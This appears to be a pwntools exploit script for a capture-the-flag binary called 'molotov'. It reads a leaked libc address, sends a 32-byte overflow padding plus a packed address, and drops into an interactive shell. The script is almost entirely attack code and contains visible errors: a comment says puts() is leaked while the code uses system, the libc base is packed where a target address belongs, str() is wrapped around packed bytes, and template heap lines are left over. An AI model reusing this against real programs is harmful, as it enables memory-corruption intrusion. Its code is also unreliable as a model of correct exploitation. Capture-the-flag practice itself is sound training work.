#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("molotov")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        # return remote("")
        return process(elf.path)


# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
system=io.recvline()
log.info(f"system: {system}")
io.recvuntil("Input :")
libc.address = int(system, 16) - libc.sym.system
log.info(f"system: 0x{libc.address:02x}")
padd="A"*32
payload=padd+str(p32(libc.address))
io.sendline(payload);

# This binary leaks the heap start address.
# io.recvuntil("heap @ ")
# heap = int(io.recvline(), 16)
# io.recvuntil("> ")
# io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The "heap" variable holds the heap start address.
# log.info(f"heap: 0x{heap:02x}")


# =============================================================================

io.interactive()
